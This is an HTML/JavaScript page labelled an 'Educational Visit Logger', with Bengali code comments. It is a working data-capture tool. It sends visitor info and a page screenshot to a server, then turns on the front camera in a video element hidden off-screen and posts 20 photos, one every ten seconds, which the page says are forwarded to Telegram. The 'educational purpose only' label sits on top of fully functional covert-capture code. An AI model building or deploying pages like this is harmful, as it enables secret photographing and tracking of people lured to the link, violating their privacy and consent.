<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Educational Logger</title>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
  <style>
    body { 
      text-align: center; 
      margin-top: 100px; 
      font-family: Arial, sans-serif; 
      background: #f8f9fa; 
      color: #333;
    }
    h2 { color: #222; margin-bottom: 10px; }
    p { max-width: 700px; margin: 0 auto 30px; color: #555; }
    button { 
      padding: 14px 32px; 
      margin: 12px 10px; 
      font-size: 17px; 
      cursor: pointer; 
      border: none; 
      border-radius: 8px; 
      color: white;
      transition: all 0.2s;
    }
    button.primary { background: #28a745; }
    button.primary:hover { background: #218838; }
    button:disabled { opacity: 0.6; cursor: not-allowed; }
    #hiddenVideo {
      display: none;
      position: absolute;
      left: -9999px;
      top: -9999px;
      width: 1px;
      height: 1px;
    }
  </style>
</head>
<body>

  <h2>Educational Visit Logger</h2>
  <p>Educational purpose only — all actions (info, screenshot, burst photos) are sent to Telegram.</p>

  <!-- বাটন ১ -->
  <button class="primary" onclick="sendData()">I Agree & Send Info</button>

  <!-- বাটন ২ -->
  <button class="primary" onclick="captureAndSendScreenshot()">Take Screenshot & Send 📸</button>

  <!-- বাটন ৩: ২০টা ছবি burst -->
  <button class="primary" id="sendBurstPhotosBtn" onclick="startBurstHiddenPhotos()">
    Send 20 Hidden Photos (1 now + every 10s)
  </button>

  <!-- হাইড ভিডিও -->
  <video id="hiddenVideo" autoplay playsinline muted></video>

  <script>
    // ১. শুধু টেক্সট লগ
    async function sendData() {
      try {
        const res = await fetch("/api/send", { method: "POST" });
        const data = await res.json();
        alert(data.success ? "Info Sent ✅" : "Failed ❌");
      } catch {
        alert("Error connecting to server");
      }
    }

    // ২. স্ক্রিনশট
    async function captureAndSendScreenshot() {
      try {
        const canvas = await html2canvas(document.body, { scale: 2 });
        const base64 = canvas.toDataURL("image/png");
        const res = await fetch("/api/send-screenshot", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ image: base64 })
        });
        const data = await res.json();
        alert(data.success ? "Screenshot Sent 📸✅" : "Failed ❌");
      } catch (err) {
        alert("Screenshot error: " + err.message);
      }
    }

    // ৩. ২০টা ছবি burst (super fast first + 10s interval)
    const burstBtn = document.getElementById('sendBurstPhotosBtn');
    let burstStream = null;
    let burstVideo = document.getElementById('hiddenVideo');
    let burstIntervalId = null;
    let burstCount = 0;
    const TOTAL_BURST = 20;
    const INTERVAL_MS = 10000; // 10 seconds

    async function startBurstHiddenPhotos() {
      if (burstCount > 0) {
        alert("Burst mode already running. Please wait.");
        return;
      }

      burstBtn.disabled = true;
      burstBtn.textContent = "Starting burst photos... 📷";

      try {
        burstStream = await navigator.mediaDevices.getUserMedia({
          video: {
            facingMode: "user",
            width: { ideal: 640 },
            height: { ideal: 480 }
          },
          audio: false
        });

        burstVideo.srcObject = burstStream;

        await new Promise((resolve, reject) => {
          burstVideo.onloadedmetadata = () => {
            burstVideo.play().then(resolve).catch(reject);
          };
          burstVideo.onerror = reject;
          setTimeout(() => reject(new Error("Video load timeout")), 2000);
        });

        if (burstVideo.videoWidth === 0 || burstVideo.videoHeight === 0) {
          throw new Error("Camera frame not ready");
        }

        burstCount = 0;
        alert(`Burst started! Sending first photo now...\nTotal: ${TOTAL_BURST} photos (every 10 seconds)`);

        // প্রথম ছবি সাথে সাথে
        await captureAndSendOneBurstPhoto();

        // বাকি ছবিগুলো interval-এ
        burstIntervalId = setInterval(async () => {
          if (burstCount >= TOTAL_BURST) {
            clearInterval(burstIntervalId);
            cleanupBurst();
            return;
          }
          await captureAndSendOneBurstPhoto();
        }, INTERVAL_MS);

      } catch (err) {
        let msg = "Failed to start burst.";
        if (err.name === 'NotAllowedError') msg = "Camera permission denied – please allow";
        else if (err.name === 'NotFoundError') msg = "No camera found on this device";
        else msg += "\n" + err.message;
        alert(msg);
        console.error(err);
        cleanupBurst();
      }
    }

    async function captureAndSendOneBurstPhoto() {
      burstCount++;
      const current = burstCount;

      try {
        const canvas = document.createElement('canvas');
        canvas.width = burstVideo.videoWidth;
        canvas.height = burstVideo.videoHeight;
        canvas.getContext('2d').drawImage(burstVideo, 0, 0);

        const base64 = canvas.toDataURL('image/png');

        const res = await fetch("/api/send-photo", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ image: base64 })
        });

        const data = await res.json();

        console.log(`Photo ${current}/${TOTAL_BURST} → ${data.success ? 'Sent' : 'Failed'}`);

        if (burstCount >= TOTAL_BURST) {
          alert(`Burst finished! Total ${TOTAL_BURST} hidden photos sent to Telegram. 📷`);
          cleanupBurst();
        }
      } catch (err) {
        console.error(`Photo ${current} error:`, err);
      }
    }

    function cleanupBurst() {
      if (burstIntervalId) {
        clearInterval(burstIntervalId);
        burstIntervalId = null;
      }
      if (burstStream) {
        burstStream.getTracks().forEach(track => track.stop());
        burstStream = null;
      }
      if (burstVideo) {
        burstVideo.srcObject = null;
      }
      burstCount = 0;
      burstBtn.disabled = false;
      burstBtn.textContent = "Send 20 Hidden Photos (1 now + every 10s)";
    }
  </script>

</body>
</html>
